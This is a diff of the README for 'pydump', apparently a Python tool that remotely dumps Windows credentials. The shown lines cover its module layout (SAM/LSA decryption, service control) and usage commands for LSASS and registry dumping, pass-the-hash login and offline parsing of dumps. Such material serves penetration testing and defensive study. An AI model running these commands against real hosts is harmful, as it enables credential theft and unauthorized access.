@@ -56,8 +56,7 @@ pydump/                 Python orchestrator
 ├── rpc/
 │   ├── core.py         DCE/RPC bind/request
 │   ├── ndr.py          NDR encoding
-│   ├── svcctl.py       Service Control Manager
-│   └── winreg.py       Remote Registry (legacy RPC path)
+│   └── svcctl.py       Service Control Manager
 ├── secrets/
 │   ├── hivereader.py   Custom REGF hive parser
 │   ├── crypto.py       Boot key, SAM/LSA AES/DES/RC4 decrypt
@@ -102,14 +101,11 @@ python -m pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd'
 # Registry only (no LSASS, no PID lookup)
 python -m pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -m registry
 
-# LSASS only
-python -m pydump dump -t 192.168.1.50 -u admin -p pass -m pipe
+# Save raw LSASS dump
+python -m pydump dump -t 192.168.1.50 -u admin -p pass -o lsass.dmp
 
 # Pass-the-Hash
 python -m pydump dump -t 192.168.1.50 -u admin -H aad3b435b51404eeaad3b435b51404ee
-
-# Save raw LSASS dump
-python -m pydump dump -t 192.168.1.50 -u admin -p pass -o lsass.dmp
 
 # Parse existing dump offline
 python -m pydump parse -f lsass.dmp
